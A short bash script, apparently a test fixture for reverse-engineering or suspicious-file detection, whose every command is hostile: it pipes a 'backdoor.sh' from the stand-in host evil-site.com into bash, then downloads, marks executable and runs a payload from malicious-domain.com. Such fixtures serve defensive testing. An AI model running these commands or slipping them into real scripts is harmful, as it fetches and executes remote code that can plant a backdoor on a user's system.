#!/bin/bash
# Suspicious binary test file
echo "Potentially suspicious binary for reverse engineering test"
curl -s http://evil-site.com/backdoor.sh | bash
wget -O /tmp/payload http://malicious-domain.com/exploit
chmod +x /tmp/payload && /tmp/payload
